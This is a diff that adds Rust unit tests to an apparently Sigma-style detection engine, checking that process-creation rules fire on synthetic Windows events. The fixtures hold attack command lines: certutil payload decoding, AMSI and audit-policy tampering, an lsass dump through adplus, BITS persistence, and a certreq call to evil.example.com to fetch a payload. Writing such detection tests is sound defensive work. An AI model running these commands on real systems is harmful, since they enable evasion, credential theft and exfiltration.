@@ -619,3 +619,281 @@ fn benign_service_install_fires_nothing() {
         "benign service install should not fire, got {hits:?}"
     );
 }
+
+// ============================================================
+// Additional process_creation coverage (LOLBAS / persistence / evasion)
+// ============================================================
+
+/// Certutil Base64/Hex Decoding (cc9cbe82): condition is "all of selection_*" —
+/// requires certutil.exe AND a CommandLine containing '-decode ' or '-decodehex '.
+#[test]
+fn certutil_decode_fires() {
+    let engine = load_bundled();
+    let ev = proc_creation(json!({
+        "Image": r"C:\Windows\System32\certutil.exe",
+        "OriginalFileName": "CertUtil.exe",
+        "CommandLine": r"certutil.exe -decode C:\Users\victim\payload.b64 C:\Users\victim\payload.exe"
+    }));
+    let hits = engine.match_event(&ev).unwrap();
+    let hit = hits
+        .iter()
+        .find(|f| f.rule_id.as_deref() == Some("cc9cbe82-7bc0-4ef5-bc23-bbfb83947be7"))
+        .expect("Certutil decode rule should fire");
+    assert!(
+        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
+        "DRL 1.1: author must be present"
+    );
+}
+
+/// Tor Browser/Client Execution (62f7c9bf): condition is "selection" (1 of the three
+/// alternatives) — this event matches Image ending in '\tor.exe'.
+#[test]
+fn tor_browser_execution_fires() {
+    let engine = load_bundled();
+    let ev = proc_creation(json!({
+        "Image": r"C:\Users\victim\Desktop\Tor Browser\Browser\TorBrowser\Tor\tor.exe"
+    }));
+    let hits = engine.match_event(&ev).unwrap();
+    let hit = hits
+        .iter()
+        .find(|f| f.rule_id.as_deref() == Some("62f7c9bf-9135-49b2-8aeb-1e54a6ecc13c"))
+        .expect("Tor Browser execution rule should fire");
+    assert!(
+        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
+        "DRL 1.1: author must be present"
+    );
+}
+
+/// Cloudflared Tunnel Execution (9a019ffc): condition is "selection" — CommandLine
+/// must contain both ' tunnel ' and ' run ' (contains|all) plus one of the
+/// credential/config flags.
+#[test]
+fn cloudflared_tunnel_run_fires() {
+    let engine = load_bundled();
+    let ev = proc_creation(json!({
+        "Image": r"C:\Users\victim\Downloads\cloudflared.exe",
+        "CommandLine": r"cloudflared.exe tunnel run --token eyJhIjoiZXZpbCJ9"
+    }));
+    let hits = engine.match_event(&ev).unwrap();
+    let hit = hits
+        .iter()
+        .find(|f| f.rule_id.as_deref() == Some("9a019ffc-3580-4c9d-8d87-079f7e8d3fd4"))
+        .expect("Cloudflared tunnel run rule should fire");
+    assert!(
+        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
+        "DRL 1.1: author must be present"
+    );
+}
+
+/// 7-Zip Password-Protected Compression for Exfiltration (9fbf5927): condition is
+/// "all of selection_*" — requires 7z.exe image, a password flag (' -p'), and an
+/// archive action (' a ' add or ' u ' update).
+#[test]
+fn sevenzip_password_compression_fires() {
+    let engine = load_bundled();
+    let ev = proc_creation(json!({
+        "Image": r"C:\Program Files\7-Zip\7z.exe",
+        "OriginalFileName": "7z.exe",
+        "CommandLine": r"7z.exe a -pS3cr3t! archive.7z C:\Users\victim\Documents"
+    }));
+    let hits = engine.match_event(&ev).unwrap();
+    let hit = hits
+        .iter()
+        .find(|f| f.rule_id.as_deref() == Some("9fbf5927-5261-4284-a71d-f681029ea574"))
+        .expect("7-Zip password compression rule should fire");
+    assert!(
+        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
+        "DRL 1.1: author must be present"
+    );
+}
+
+/// Monitoring For Persistence Via BITS (b9cbbc17): condition is "selection_img and
+/// (all of selection_cli_notify_* or all of selection_cli_add_*)" — this event
+/// satisfies the notify branch: /SetNotifyCmdLine plus cmd.exe.
+#[test]
+fn bitsadmin_persistence_fires() {
+    let engine = load_bundled();
+    let ev = proc_creation(json!({
+        "Image": r"C:\Windows\System32\bitsadmin.exe",
+        "CommandLine": r"bitsadmin.exe /SetNotifyCmdLine myjob cmd.exe /c evil.bat"
+    }));
+    let hits = engine.match_event(&ev).unwrap();
+    let hit = hits
+        .iter()
+        .find(|f| f.rule_id.as_deref() == Some("b9cbbc17-d00d-4e3d-a827-b06d03d2380d"))
+        .expect("BITS persistence rule should fire");
+    assert!(
+        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
+        "DRL 1.1: author must be present"
+    );
+}
+
+/// AMSI Registry Tampering (7dbbcac2): condition is "selection_key and (all of
+/// selection_powershell_* or all of selection_reg_*)" — this event satisfies the
+/// PowerShell branch: pwsh/powershell image + Set-ItemProperty, targeting the
+/// Windows Script Settings AmsiEnable key.
+#[test]
+fn amsi_registry_tampering_fires() {
+    let engine = load_bundled();
+    let ev = proc_creation(json!({
+        "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+        "OriginalFileName": "PowerShell.EXE",
+        "CommandLine": r"powershell.exe Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows Script\Settings' -Name AmsiEnable -Value 0"
+    }));
+    let hits = engine.match_event(&ev).unwrap();
+    let hit = hits
+        .iter()
+        .find(|f| f.rule_id.as_deref() == Some("7dbbcac2-57a0-45ac-b306-ff30a8bd2981"))
+        .expect("AMSI registry tampering rule should fire");
+    assert!(
+        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
+        "DRL 1.1: author must be present"
+    );
+}
+
+/// Audit Policy Tampering Via Auditpol (0a13e132): condition is "all of selection_*"
+/// — requires auditpol.exe image and a CommandLine containing 'disable', 'clear',
+/// 'remove', or 'restore'.
+#[test]
+fn auditpol_tampering_fires() {
+    let engine = load_bundled();
+    let ev = proc_creation(json!({
+        "Image": r"C:\Windows\System32\auditpol.exe",
+        "OriginalFileName": "AUDITPOL.EXE",
+        "CommandLine": r"auditpol.exe /clear /y"
+    }));
+    let hits = engine.match_event(&ev).unwrap();
+    let hit = hits
+        .iter()
+        .find(|f| f.rule_id.as_deref() == Some("0a13e132-651d-11eb-ae93-0242ac130002"))
+        .expect("Auditpol tampering rule should fire");
+    assert!(
+        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
+        "DRL 1.1: author must be present"
+    );
+}
+
+/// Interactive AT Job (60fc936d): condition is "selection" — requires Image ending
+/// in '\at.exe' AND CommandLine containing 'interactive'.
+#[test]
+fn at_interactive_execution_fires() {
+    let engine = load_bundled();
+    let ev = proc_creation(json!({
+        "Image": r"C:\Windows\System32\at.exe",
+        "CommandLine": r"at.exe 14:00 /interactive cmd.exe"
+    }));
+    let hits = engine.match_event(&ev).unwrap();
+    let hit = hits
+        .iter()
+        .find(|f| f.rule_id.as_deref() == Some("60fc936d-2eb0-4543-8a13-911c750a1dfc"))
+        .expect("Interactive AT job rule should fire");
+    assert!(
+        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
+        "DRL 1.1: author must be present"
+    );
+}
+
+/// Windows EventLog Autologger Session Registry Modification (d7b81144): condition is
+/// "all of selection_*" — requires reg/powershell image, an add/set action, the
+/// Autologger base path, and a Start/Enabled key reference.
+#[test]
+fn autologger_registry_modification_fires() {
+    let engine = load_bundled();
+    let ev = proc_creation(json!({
+        "Image": r"C:\Windows\System32\reg.exe",
+        "OriginalFileName": "reg.exe",
+        "CommandLine": r"reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application /v Start /t REG_DWORD /d 0 /f"
+    }));
+    let hits = engine.match_event(&ev).unwrap();
+    let hit = hits
+        .iter()
+        .find(|f| f.rule_id.as_deref() == Some("d7b81144-b866-48a4-9bcc-275dc69d870e"))
+        .expect("Autologger registry modification rule should fire");
+    assert!(
+        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
+        "DRL 1.1: author must be present"
+    );
+}
+
+/// Potential Binary Proxy Execution Via Cdb.EXE (b5c7395f): condition is "all of
+/// selection*" — requires cdb.exe image and a CommandLine containing ' -c ' or
+/// ' -cf ' (debugger script flags).
+#[test]
+fn cdb_arbitrary_command_fires() {
+    let engine = load_bundled();
+    let ev = proc_creation(json!({
+        "Image": r"C:\Users\victim\Downloads\cdb.exe",
+        "OriginalFileName": "CDB.Exe",
+        "CommandLine": r"cdb.exe -c evil.script -p 1234"
+    }));
+    let hits = engine.match_event(&ev).unwrap();
+    let hit = hits
+        .iter()
+        .find(|f| f.rule_id.as_deref() == Some("b5c7395f-e501-4a08-94d4-57fe7a9da9d2"))
+        .expect("Cdb arbitrary command execution rule should fire");
+    assert!(
+        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
+        "DRL 1.1: author must be present"
+    );
+}
+
+/// Adplus.EXE Abuse (2f869d59): condition is "all of selection_*" — requires
+/// adplus.exe image and a CommandLine containing a memory-dump/config/command flag
+/// (' -hang ' here).
+#[test]
+fn adplus_memory_dump_fires() {
+    let engine = load_bundled();
+    let ev = proc_creation(json!({
+        "Image": r"C:\Tools\adplus.exe",
+        "OriginalFileName": "Adplus.exe",
+        "CommandLine": r"adplus.exe -hang -pn lsass.exe -o C:\Temp"
+    }));
+    let hits = engine.match_event(&ev).unwrap();
+    let hit = hits
+        .iter()
+        .find(|f| f.rule_id.as_deref() == Some("2f869d59-7f6a-4931-992c-cce556ff2d53"))
+        .expect("Adplus memory dump rule should fire");
+    assert!(
+        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
+        "DRL 1.1: author must be present"
+    );
+}
+
+/// Suspicious CertReq Command to Download (4480827a): condition is "all of
+/// selection_*" — requires certreq.exe image, a -Post flag, a -config flag, and
+/// 'http' in the CommandLine.
+#[test]
+fn certreq_download_fires() {
+    let engine = load_bundled();
+    let ev = proc_creation(json!({
+        "Image": r"C:\Windows\System32\certreq.exe",
+        "OriginalFileName": "CertReq.exe",
+        "CommandLine": r"certreq.exe -Post -config http://evil.example.com/cert C:\Users\victim\payload.exe"
+    }));
+    let hits = engine.match_event(&ev).unwrap();
+    let hit = hits
+        .iter()
+        .find(|f| f.rule_id.as_deref() == Some("4480827a-9799-4232-b2c4-ccc6c4e9e12b"))
+        .expect("Certreq download rule should fire");
+    assert!(
+        hit.rule_author.as_deref().is_some_and(|a| !a.is_empty()),
+        "DRL 1.1: author must be present"
+    );
+}
+
+/// A benign process_creation event (notepad opening a batch script that happens to
+/// exist under a normal path) fires none of the new process_creation rules added in
+/// this batch.
+#[test]
+fn benign_process_creation_extra_batch_fires_nothing() {
+    let engine = load_bundled();
+    let ev = proc_creation(json!({
+        "Image": r"C:\Windows\System32\notepad.exe",
+        "CommandLine": r"notepad.exe C:\Users\alice\notes.txt"
+    }));
+    let hits = engine.match_event(&ev).unwrap();
+    assert!(
+        hits.is_empty(),
+        "benign notepad launch should not fire, got {hits:?}"
+    );
+}
